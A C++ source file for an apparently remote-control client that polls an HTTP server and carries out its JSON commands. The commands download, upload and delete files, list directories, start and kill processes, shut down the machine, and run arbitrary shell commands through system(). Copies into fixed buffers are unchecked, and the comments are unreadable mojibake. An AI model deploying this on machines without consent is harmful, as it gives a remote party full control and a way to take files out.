#include "XContral_Hdr.h"

XHTHREAD XContral_Thread_HttpTask()
{
	time_t nTimeStart = time(NULL);

	while (bIsRun)
	{
		int nBLen = 0;
		TCHAR* ptszMsgBody = NULL;
		if (APIHelp_HttpRequest_Post(st_ServiceConfig.tszTaskUrl, NULL, NULL, &ptszMsgBody, &nBLen))
		{
			nTimeStart = time(NULL);//����
			XContral_Task_ProtocolParse(ptszMsgBody, nBLen);
		}
		BaseLib_OperatorMemory_FreeCStyle((XPPMEM)&ptszMsgBody);
		//ͨ��һ���򵥵�������������ӳ�
		time_t nTimeEnd = time(NULL);
		if ((nTimeEnd - nTimeStart) > 1)
		{
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
		else
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
	}
	return 0;
}

BOOL XContral_Task_ProtocolParse(LPCTSTR lpszMsgBuffer, int nMsgLen)
{
	Json::Value st_JsonRoot;
	Json::CharReaderBuilder st_JsonBuild;
	Json::CharReader* pSt_JsonReader(st_JsonBuild.newCharReader());
	JSONCPP_STRING st_JsonError;

	if (!pSt_JsonReader->parse(lpszMsgBuffer, lpszMsgBuffer + nMsgLen, &st_JsonRoot, &st_JsonError))
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:JSON��������"));
		return FALSE;
	}
	delete pSt_JsonReader;
	pSt_JsonReader = NULL;
	//����������к�
	int nTaskSerial = st_JsonRoot["nTaskSerial"].asUInt();
	if (nTaskSerial <= m_nTaskSerial)
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:�������кŲ���ȷ"));
		return FALSE;
	}
	m_nTaskSerial = nTaskSerial;
	//ִ������
	switch (st_JsonRoot["unOperatorCode"].asUInt())
	{
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DOWNFILE:
	{
		XNETHANDLE xhTask;
		TCHAR tszFileUrl[MAX_PATH];
		TCHAR tszSaveUrl[MAX_PATH];

		memset(tszFileUrl, '\0', MAX_PATH);
		memset(tszSaveUrl, '\0', MAX_PATH);
		_tcscpy(tszFileUrl, st_JsonRoot["DownloadUrl"].asCString());
		_tcscpy(tszSaveUrl, st_JsonRoot["SaveUrl"].asCString());

		if (!DownLoad_Http_Create(&xhTask, tszFileUrl, tszSaveUrl))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:����������ʧ��,������:%lX"), Download_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETDOWNLOAD_TASKINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETDOWNLOAD_TASKINFO));

			if (DownLoad_Http_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_XENGINE_DOWNLOAD_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		DownLoad_Http_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEFILE:
		TCHAR tszDelFile[MAX_PATH];
		memset(tszDelFile, '\0', MAX_PATH);

		_tcscpy(tszDelFile, st_JsonRoot["DeleteFile"].asCString());
		if (-1 == _tremove(tszDelFile))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:ɾ���ļ�������ʧ��,������:%d"), errno);
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEDIR:
		TCHAR tszDelDir[MAX_PATH];
		memset(tszDelDir, '\0', MAX_PATH);

		_tcscpy(tszDelDir, st_JsonRoot["DeleteDir"].asCString());
		if (!SystemApi_File_DeleteMutilFolder(tszDelDir))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:ɾ���ļ���������ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_UPFILE:
	{
		XNETHANDLE xhTask;
		TCHAR tszUPFile[MAX_PATH];
		TCHAR tszUPUrl[MAX_PATH];

		memset(tszUPFile, '\0', MAX_PATH);
		memset(tszUPUrl, '\0', MAX_PATH);
		_tcscpy(tszUPFile, st_JsonRoot["UPLoadFile"].asCString());
		_tcscpy(tszUPUrl, st_JsonRoot["UPLoadUrl"].asCString());

		if (!DownLoad_Ftp_Create(&xhTask, tszUPFile, tszUPUrl, FALSE, FALSE))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:FTP�ϴ�������ʧ��,������:%lX"), Download_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETDOWNLOAD_TASKINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETDOWNLOAD_TASKINFO));

			if (DownLoad_Ftp_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_XENGINE_DOWNLOAD_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		DownLoad_Ftp_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_GETLIST:
	{
		int nListCount = 0;
		CHAR** ppszFileList;
		if (!SystemApi_File_EnumFile(st_JsonRoot["FindPath"].asCString(), &ppszFileList, &nListCount))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:�����ļ��б�ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
		XContral_Handle_PostListFile(ppszFileList, nListCount, st_JsonRoot["PostUrl"].asCString());
		BaseLib_OperatorMemory_Free((XPPPMEM)&ppszFileList, nListCount);
	}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_EXEC:
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_POPMESSAGE:
	{
		DWORD dwProcessId;
		TCHAR tszExeFile[MAX_PATH];
		memset(tszExeFile, '\0', MAX_PATH);

		_tcscpy(tszExeFile, st_JsonRoot["ExecFile"].asCString());

		if (!SystemApi_Process_CreateProcess(&dwProcessId, tszExeFile))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:���󴴽�����ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_STOPPROCESS:
		TCHAR tszProcessName[64];
		memset(tszProcessName, '\0', sizeof(tszProcessName));
		_stprintf_s(tszProcessName, _T("%s"), st_JsonRoot["tszProcessName"].asCString());
		if (!SystemApi_Process_Stop(tszProcessName))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:����ֹͣ����ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_SHUTDOWN:
		if (!SystemApi_System_Shutdown((DWORD)st_JsonRoot["ShutDownType"].asInt64()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:����ػ�ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_ECMD:
		if (-1 == system(st_JsonRoot["tszExecCmd"].asCString()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:����ִ������ʧ��,������:%lX"), SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_CONNECT:
		if (IPPROTO_TCP == st_JsonRoot["nIPType"].asUInt())
		{
			XClient_TCPSelect_Close(hTCPSocket);
			XClient_TCPSelect_Create(&hTCPSocket, st_JsonRoot["tszIPAddr"].asCString(), st_JsonRoot["nPort"].asInt());
		}
		else
		{
			XClient_UDPSelect_Close(hUDPSocket);
			XClient_UDPSelect_Create(&hUDPSocket, st_JsonRoot["tszIPAddr"].asCString(), st_JsonRoot["nPort"].asInt());
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_USER:
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_NOTHINGTODO:
		break;
	default:
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, _T("HTTP����:����Ĳ����벻֧��,������:%d"), st_JsonRoot["unOperatorCode"].asUInt());
		return FALSE;
	}
	return TRUE;
}